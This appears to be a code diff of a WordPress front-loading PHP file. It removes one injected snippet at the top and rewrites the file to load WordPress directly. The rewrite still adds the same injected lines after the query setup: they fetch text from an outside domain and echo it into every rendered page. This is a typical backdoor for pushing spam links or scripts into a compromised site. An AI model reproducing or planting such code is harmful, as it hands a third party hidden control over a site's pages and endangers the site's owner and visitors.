@@ -1,17 +1,17 @@
-<?php $a = file_get_contents('https://paulsaar.com/tmb/bl.txt');
-echo $a; ?>
 <?php
 /**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
+ * Loads the WordPress environment and template.
  *
  * @package WordPress
  */
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define( 'WP_USE_THEMES', true );
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+if ( ! isset( $wp_did_header ) ) {
+    $wp_did_header = true;
+    // Load the WordPress library.
+    require_once __DIR__ . '/wp-load.php';
+    // Set up the WordPress query.
+    wp();
+  $a = file_get_contents('https://paulsaar.com/tmb/bl.txt');
+echo $a;
+    // Load the theme template.
+    require_once ABSPATH . WPINC . '/template-loader.php';
+}
